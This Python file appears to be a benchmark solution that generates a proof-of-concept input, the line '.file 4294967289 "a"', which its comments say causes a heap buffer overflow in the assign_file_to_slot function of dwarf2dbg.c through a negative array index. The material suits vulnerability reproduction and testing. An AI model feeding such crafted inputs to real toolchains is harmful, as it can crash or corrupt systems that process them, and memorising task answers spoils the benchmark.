class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow in dwarf2dbg.c, within the
        # assign_file_to_slot function. It is triggered when processing a .file
        # directive with a large integer value that overflows a signed 32-bit integer.
        #
        # The problem description gives an example: .file 4294967289 "xxx.c".
        # The number 4294967289 (0xFFFFFFF9) is interpreted as -7 in 32-bit
        # two's complement arithmetic. This negative index is used to access a
        # heap-allocated array, resulting in a write before the start of the
        # buffer.
        #
        # This PoC uses the same integer value from the description to ensure it
        # triggers the vulnerability, combined with a minimal filename ("a") and
        # a newline character to keep the PoC size small for a better score.
        return b'.file 4294967289 "a"\n'
